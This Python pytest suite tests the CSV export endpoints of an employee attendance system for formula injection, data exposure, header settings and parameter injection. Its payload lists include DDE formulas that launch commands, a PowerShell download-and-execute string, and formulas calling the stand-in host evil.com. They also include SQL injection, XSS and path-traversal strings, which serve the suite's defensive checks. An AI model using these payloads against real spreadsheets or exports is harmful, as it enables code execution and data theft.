"""
CSV Injection and Export Security Testing Suite

Tests CSV export functionality for injection vulnerabilities:
- CSV injection attacks (formula injection)
- Export data tampering
- File download security
- Mass data exposure
"""

import pytest
import csv
import io
import tempfile
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
from httpx import AsyncClient

from tests.security.conftest import (
    SecurityTester, SecurityVulnerability, SecurityLevel,
    security_client
)
from app.models.models import Employee, AttendanceRecord, Device
from tests.conftest import test_db


class CSVSecurityTester(SecurityTester):
    """Specialized CSV and export security testing"""

    async def test_csv_formula_injection(self, db) -> list[SecurityVulnerability]:
        """Test CSV formula injection vulnerabilities"""
        vulnerabilities = []

        # CSV formula injection payloads
        csv_payloads = [
            # Excel formula injection
            '=cmd|"/c calc"!A1',
            '=SUM(1+1)*cmd|"/c calc"!A1',
            '=2+5+cmd|"/c calc"!A1',

            # OpenOffice/LibreOffice formula injection
            '=HYPERLINK("http://evil.com","Click here")',
            '=cmd|"/c powershell IEX(wget 0r.pe/p)"',

            # Google Sheets formula injection
            '=IMPORTXML("http://evil.com/","//title")',
            '=IMAGE("http://evil.com/log.gif")',

            # Dynamic Data Exchange (DDE) attacks
            '@SUM(1+1)*cmd|"/c calc"!A1',
            '+cmd|"/c calc"!A1',
            '-cmd|"/c calc"!A1',

            # Field separator abuse
            '\t=cmd|"/c calc"!A1',
            ',=cmd|"/c calc"!A1',

            # Unicode and encoding attacks
            '﻿=cmd|"/c calc"!A1',  # With BOM
            '=\u0063\u006d\u0064|\"/c calc\"!A1',  # Unicode encoded

            # CSV injection with Thai characters
            '=cmd|"/c calc"!A1,พนักงาน',
            'พนักงาน=cmd|"/c calc"!A1',
        ]

        # Create test employees with malicious data
        for i, payload in enumerate(csv_payloads[:10]):  # Limit to avoid too many test records
            test_employee = Employee(
                badge_number=f"CSV_INJ_{i:03d}",
                english_name=payload,
                thai_name=f"ทดสอบ {payload}",
                department=payload,
                position=f"Position {payload}",
                is_active=True
            )
            db.add(test_employee)

        db.commit()

        # Test CSV export endpoints
        csv_endpoints = [
            "/api/export/employees-csv/",
            "/api/export/attendance-csv/",
            "/api/export/quick-export/employees",
        ]

        for endpoint in csv_endpoints:
            try:
                response = await self.client.get(endpoint)

                if response.status_code == 200:
                    csv_content = response.text

                    # Check for dangerous formulas in CSV
                    dangerous_patterns = ['=cmd|', '=SUM(', '=HYPERLINK', '=IMPORTXML', '@SUM(', '+cmd|', '-cmd|']

                    for pattern in dangerous_patterns:
                        if pattern in csv_content:
                            vulnerabilities.append(SecurityVulnerability(
                                id=f"csv_inject_{endpoint}_{len(vulnerabilities)}",
                                title=f"CSV Formula Injection - {endpoint}",
                                description=f"CSV export contains dangerous formula: {pattern}",
                                severity=SecurityLevel.HIGH,
                                category="Injection",
                                endpoint=endpoint,
                                payload=pattern,
                                recommendation="Escape CSV formulas by prefixing with single quote or space",
                                cwe="CWE-1236"
                            ))

                    # Check if CSV is properly formatted
                    try:
                        csv_reader = csv.reader(io.StringIO(csv_content))
                        rows = list(csv_reader)

                        # Look for formula injection in specific cells
                        for row_idx, row in enumerate(rows):
                            for col_idx, cell in enumerate(row):
                                if cell and any(cell.startswith(prefix) for prefix in ['=', '+', '-', '@']):
                                    # Check if it's a legitimate formula or injection
                                    if 'cmd|' in cell or 'calc' in cell or 'powershell' in cell:
                                        vulnerabilities.append(SecurityVulnerability(
                                            id=f"csv_cell_inject_{endpoint}_{row_idx}_{col_idx}",
                                            title=f"CSV Cell Formula Injection - {endpoint}",
                                            description=f"Malicious formula in CSV cell [{row_idx},{col_idx}]: {cell[:50]}...",
                                            severity=SecurityLevel.HIGH,
                                            category="Injection",
                                            endpoint=endpoint,
                                            payload=cell,
                                            recommendation="Sanitize CSV cell content before export",
                                            cwe="CWE-1236"
                                        ))

                    except csv.Error:
                        # Malformed CSV might also be a vulnerability
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"csv_malformed_{endpoint}_{len(vulnerabilities)}",
                            title=f"Malformed CSV Export - {endpoint}",
                            description="CSV export produces malformed content",
                            severity=SecurityLevel.MEDIUM,
                            category="Data Integrity",
                            endpoint=endpoint,
                            payload=None,
                            recommendation="Validate CSV format before serving",
                            cwe="CWE-20"
                        ))

            except Exception:
                pass

        # Cleanup test data
        test_employees = db.query(Employee).filter(Employee.badge_number.like("CSV_INJ_%")).all()
        for employee in test_employees:
            db.delete(employee)
        db.commit()

        return vulnerabilities

    async def test_export_data_exposure(self) -> list[SecurityVulnerability]:
        """Test for excessive data exposure in exports"""
        vulnerabilities = []

        export_endpoints = [
            "/api/export/employees-csv/",
            "/api/export/attendance-csv/",
            "/api/export/full-export/",
            "/api/export/quick-export/employees",
            "/api/export/quick-export/attendance",
        ]

        for endpoint in export_endpoints:
            try:
                response = await self.client.get(endpoint)

                if response.status_code == 200:
                    export_content = response.text.lower()

                    # Check for sensitive data patterns
                    sensitive_patterns = [
                        r'password.*[:=]\s*\w+',
                        r'secret.*[:=]\s*\w+',
                        r'api.*key.*[:=]\s*[\w-]+',
                        r'token.*[:=]\s*[\w-]+',
                        r'/home/[\w-]+',
                        r'c:\\\\users\\\\[\w-]+',
                        r'192\.168\.\d+\.\d+',  # IP addresses
                        r'admin.*[:=]\s*\w+',
                    ]

                    import re
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, export_content, re.IGNORECASE)
                        if matches:
                            vulnerabilities.append(SecurityVulnerability(
                                id=f"export_sensitive_{endpoint}_{len(vulnerabilities)}",
                                title=f"Sensitive Data in Export - {endpoint}",
                                description=f"Export contains sensitive information: {matches[0]}",
                                severity=SecurityLevel.MEDIUM,
                                category="Information Disclosure",
                                endpoint=endpoint,
                                payload=matches[0],
                                recommendation="Remove sensitive data from exports",
                                cwe="CWE-200"
                            ))

                    # Check export size (potential mass data exposure)
                    if len(export_content) > 1000000:  # 1MB limit
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"export_size_{endpoint}_{len(vulnerabilities)}",
                            title=f"Mass Data Export - {endpoint}",
                            description=f"Export is very large ({len(export_content)} bytes), potential data exposure",
                            severity=SecurityLevel.LOW,
                            category="Information Disclosure",
                            endpoint=endpoint,
                            payload=f"{len(export_content)} bytes",
                            recommendation="Implement pagination or limits on export size",
                            cwe="CWE-200"
                        ))

            except Exception:
                pass

        return vulnerabilities

    async def test_export_file_security(self) -> list[SecurityVulnerability]:
        """Test export file download security"""
        vulnerabilities = []

        export_endpoints = [
            "/api/export/employees-csv/",
            "/api/export/attendance-csv/",
        ]

        for endpoint in export_endpoints:
            try:
                response = await self.client.get(endpoint)

                if response.status_code == 200:
                    headers = response.headers

                    # Check Content-Type header
                    content_type = headers.get('content-type', '').lower()
                    if 'text/csv' not in content_type and 'application/csv' not in content_type:
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"export_content_type_{endpoint}_{len(vulnerabilities)}",
                            title=f"Incorrect CSV Content-Type - {endpoint}",
                            description=f"CSV export has incorrect Content-Type: {content_type}",
                            severity=SecurityLevel.LOW,
                            category="Configuration",
                            endpoint=endpoint,
                            payload=content_type,
                            recommendation="Set proper Content-Type header for CSV files",
                            cwe="CWE-20"
                        ))

                    # Check Content-Disposition header
                    content_disposition = headers.get('content-disposition', '')
                    if not content_disposition or 'attachment' not in content_disposition:
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"export_disposition_{endpoint}_{len(vulnerabilities)}",
                            title=f"Missing Content-Disposition - {endpoint}",
                            description="CSV export lacks proper Content-Disposition header",
                            severity=SecurityLevel.LOW,
                            category="Configuration",
                            endpoint=endpoint,
                            payload=content_disposition,
                            recommendation="Set Content-Disposition: attachment for file downloads",
                            cwe="CWE-20"
                        ))

                    # Check for cache control headers
                    cache_control = headers.get('cache-control', '').lower()
                    if 'no-cache' not in cache_control and 'no-store' not in cache_control:
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"export_cache_{endpoint}_{len(vulnerabilities)}",
                            title=f"Export Caching Issue - {endpoint}",
                            description="CSV export lacks proper cache control headers",
                            severity=SecurityLevel.LOW,
                            category="Configuration",
                            endpoint=endpoint,
                            payload=cache_control,
                            recommendation="Add no-cache, no-store headers for sensitive exports",
                            cwe="CWE-524"
                        ))

            except Exception:
                pass

        return vulnerabilities

    async def test_export_parameter_injection(self) -> list[SecurityVulnerability]:
        """Test export parameter injection"""
        vulnerabilities = []

        # Test parameter injection in export endpoints
        injection_params = [
            {"start_date": "'; DROP TABLE employees; --"},
            {"end_date": "<script>alert('XSS')</script>"},
            {"employee_id": "../../../etc/passwd"},
            {"format": "csv'; UNION SELECT * FROM devices; --"},
            {"limit": "1000000 OR 1=1"},
        ]

        base_endpoints = [
            "/api/export/attendance-csv/",
            "/api/export/employees-csv/",
        ]

        for endpoint in base_endpoints:
            for params in injection_params:
                try:
                    response = await self.client.get(endpoint, params=params)

                    if response.status_code == 200:
                        response_text = response.text

                        # Check if injection payload is reflected
                        param_value = list(params.values())[0]
                        if isinstance(param_value, str) and param_value in response_text:
                            # Check if it's dangerous reflection
                            if any(dangerous in param_value.lower() for dangerous in ['<script>', 'drop table', '../']):
                                vulnerabilities.append(SecurityVulnerability(
                                    id=f"export_param_inject_{endpoint}_{len(vulnerabilities)}",
                                    title=f"Export Parameter Injection - {endpoint}",
                                    description=f"Export reflects malicious parameter: {param_value}",
                                    severity=SecurityLevel.MEDIUM,
                                    category="Injection",
                                    endpoint=endpoint,
                                    payload=str(params),
                                    recommendation="Validate and sanitize export parameters",
                                    cwe="CWE-79"
                                ))

                        # Check for SQL error indicators
                        sql_errors = ['sql syntax', 'syntax error', 'sqlite_', 'database']
                        if any(error in response_text.lower() for error in sql_errors):
                            vulnerabilities.append(SecurityVulnerability(
                                id=f"export_sql_error_{endpoint}_{len(vulnerabilities)}",
                                title=f"SQL Error in Export - {endpoint}",
                                description="Export parameter causes SQL error disclosure",
                                severity=SecurityLevel.MEDIUM,
                                category="Information Disclosure",
                                endpoint=endpoint,
                                payload=str(params),
                                recommendation="Implement proper error handling for export parameters",
                                cwe="CWE-209"
                            ))

                except Exception:
                    pass

        return vulnerabilities


@pytest.mark.asyncio
class TestCSVSecurity:
    """Test suite for CSV and export security"""

    async def test_csv_formula_injection_prevention(self, security_client, test_db):
        """Test CSV formula injection is prevented"""
        tester = CSVSecurityTester(security_client)

        vulnerabilities = await tester.test_csv_formula_injection(test_db)

        # Should not have formula injection vulnerabilities
        injection_vulns = [v for v in vulnerabilities if "injection" in v.title.lower()]
        assert len(injection_vulns) == 0, f"CSV formula injection vulnerabilities: {injection_vulns}"

    async def test_export_data_protection(self, security_client):
        """Test export doesn't expose sensitive data"""
        tester = CSVSecurityTester(security_client)

        vulnerabilities = await tester.test_export_data_exposure()

        # Should not expose high-severity sensitive data
        sensitive_vulns = [v for v in vulnerabilities if v.severity == SecurityLevel.HIGH]
        assert len(sensitive_vulns) == 0, f"High-severity data exposure: {sensitive_vulns}"

    async def test_export_file_headers(self, security_client):
        """Test export file security headers"""
        tester = CSVSecurityTester(security_client)

        vulnerabilities = await tester.test_export_file_security()

        # File security should be properly configured
        config_vulns = [v for v in vulnerabilities if v.severity == SecurityLevel.MEDIUM]
        assert len(config_vulns) <= 1, f"Export configuration issues: {config_vulns}"

    async def test_export_parameter_security(self, security_client):
        """Test export parameter injection protection"""
        tester = CSVSecurityTester(security_client)

        vulnerabilities = await tester.test_export_parameter_injection()

        # Parameter injection should be prevented
        param_vulns = [v for v in vulnerabilities if "parameter" in v.title.lower()]
        assert len(param_vulns) == 0, f"Export parameter vulnerabilities: {param_vulns}"

    async def test_csv_content_sanitization(self, security_client, test_db):
        """Test CSV content is properly sanitized"""

        # Create employee with potentially dangerous content
        dangerous_employee = Employee(
            badge_number="DANGER_001",
            english_name='=cmd|"/c calc"!A1',
            thai_name='=SUM(A1:A10)*cmd|"/c calc"!A1',
            department='@SUM(1+1)*cmd|"/c calc"!A1',
            position='+cmd|"/c powershell"!A1',
            is_active=True
        )
        test_db.add(dangerous_employee)
        test_db.commit()

        # Export employees CSV
        response = await security_client.get("/api/export/employees-csv/")
        assert response.status_code == 200

        csv_content = response.text

        # CSV should not contain executable formulas
        dangerous_formulas = ['=cmd|', '=SUM(', '@SUM(', '+cmd|', '!A1']
        found_formulas = [formula for formula in dangerous_formulas if formula in csv_content]

        # Cleanup
        test_db.delete(dangerous_employee)
        test_db.commit()

        assert len(found_formulas) == 0, f"CSV contains dangerous formulas: {found_formulas}"

    async def test_csv_encoding_security(self, security_client, test_db):
        """Test CSV encoding handles various character sets securely"""

        # Create employee with various character encodings
        encoding_employee = Employee(
            badge_number="ENCODING_001",
            english_name="Test Employee",
            thai_name="พนักงานทดสอบ中文字符テスト",  # Thai, Chinese, Japanese
            department="отдел",  # Cyrillic
            position="مهندس",  # Arabic
            is_active=True
        )
        test_db.add(encoding_employee)
        test_db.commit()

        # Export and check encoding
        response = await security_client.get("/api/export/employees-csv/")
        assert response.status_code == 200

        # Should handle Unicode properly without injection
        csv_content = response.text
        assert "พนักงานทดสอบ" in csv_content or response.headers.get('content-type', '').find('utf-8') != -1

        # Cleanup
        test_db.delete(encoding_employee)
        test_db.commit()

    async def test_large_export_handling(self, security_client, test_db):
        """Test handling of large export requests"""

        # This test checks if the system handles large exports gracefully
        response = await security_client.get("/api/export/attendance-csv/", params={
            "limit": "999999"  # Request very large limit
        })

        # Should either limit the export or handle gracefully
        assert response.status_code in [200, 400, 413, 429], "Large export should be handled gracefully"

        if response.status_code == 200:
            # If successful, content shouldn't be excessively large
            content_length = len(response.text)
            assert content_length < 10000000, f"Export too large: {content_length} bytes"  # 10MB limit